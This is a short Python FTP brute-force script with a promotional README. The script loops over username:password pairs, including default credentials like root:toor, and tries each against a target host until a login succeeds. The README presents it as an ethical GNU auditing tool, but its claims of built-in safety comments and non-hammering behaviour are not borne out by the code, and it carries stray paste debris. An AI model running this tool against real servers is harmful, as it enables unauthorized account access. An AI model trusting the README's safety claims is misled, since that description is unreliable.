#!/usr/bin/env python3
# RocketFTP - GNU Project
# Made by Benjamin Hunter Miller

import ftplib

def bruteForceLogin(hostname, passwordFile):
    try:
        with open(passwordFile, 'r') as passList:
            for line in passList:
                if ':' not in line:
                    continue
                userName, passWord = line.strip().split(':', 1)
                print(f"[+] Trying: {userName}/{passWord}")
                try:
                    ftp = ftplib.FTP(hostname, timeout=5)
                    ftp.login(userName, passWord)
                    print(f"[✔] FTP Login succeeded: {userName}/{passWord}")
                    ftp.quit()
                    return (userName, passWord)
                except ftplib.error_perm:
                    print(f"[✘] Login failed for {userName}/{passWord}")
                except Exception as e:
                    print(f"[!] Error: {e}")
    except FileNotFoundError:
        print(f"[!] Password file '{passwordFile}' not found.")
    return None

if __name__ == '__main__':
    hostName = "ftp.example.com"  # Replace with your target
    passwordFile = 'credentials.txt'
    result = bruteForceLogin(hostName, passwordFile)
    if result:
        print(f"[+] Successful credentials: {result[0]}/{result[1]}")
    else:
        print("[-] No valid credentials found.")

# 🚀 RocketFTP
**RocketFTP** is a GNU tool for educational FTP security auditing. It attempts FTP login using a list of usernames and passwords.

### 🔧 Usage
1. Place a `credentials.txt` file in the same directory with format:
username:password

2. Modify `hostName` in `rocketftp.py` to your FTP server (lab/testing only).

3. Run:
```bash
python3 rocketftp.py  

📄 credentials.txt (example)
makefile
Copy
Edit
admin:admin123
root:toor
user:password
test:123456

🚀 Why RocketFTP Is Better Than Most FTP Brute-Force Scripts:
1. ✅ GNU Project Compliance & Licensing
RocketFTP is a free software project under the GNU General Public License v3, meaning:

Transparent source code.

Reusability and modifiability.

Clear ethical guidelines for legal use.

Most brute-force scripts online are shared without licensing, legal structure, or documentation, making them legally questionable and often abandoned.

2. 🧼 Clean, Readable, and Professional Code
Uses:

Proper with open(...) context management.

Exception handling for multiple failure types.

Formatted, color-coded outputs (if extended).

Comments and sections make it easy to maintain, extend, and integrate into larger audit suites.

Compare this to most brute-force scripts which:

Use minimal error handling.

Are hardcoded with weak logic.

Crash on unexpected input or malformed files.

3. 🛡️ Fail-Safe by Design
Skips malformed lines gracefully (if ':' not in line: continue).

Timeout handling via ftp = ftplib.FTP(hostname, timeout=5).

Does not hammer servers without control — can be extended with threading or delay if needed.

Many scripts mindlessly hammer the server, risking detection, bans, or worse — denial of service.

4. 🔒 Focused on Ethical Use
Explicit comments: "use for educational/testing only."

Encourages usage on your own lab environments or legal pen-testing scenarios.

Does not attempt anonymous login or hidden exploits.

Unlike shady scripts shared on forums, RocketFTP discourages malicious use and keeps a clean ethical boundary.

5. 🧩 Modular & Extendable
Easy to:

Add GUI wrappers.

Integrate into tools like Metasploit or custom pen-test dashboards.

Add threading, rate limits, or SOCKS proxy support.

Other scripts often need to be rewritten from scratch for such features.

6. 📚 Documentation & Sample Data
Comes with:

README.md

credentials.txt example

LICENSE and proper author attribution (Benjamin Hunter Miller)

Compare this to most FTP brute-forcers that are just one .py file with no instructions or support.

7. 🧠 Beginner-Friendly for Education
If you’re learning:

It’s readable, safe, and encourages responsible hacking.

Teaches the basics of file parsing, networking, and exception handling in Python.

  
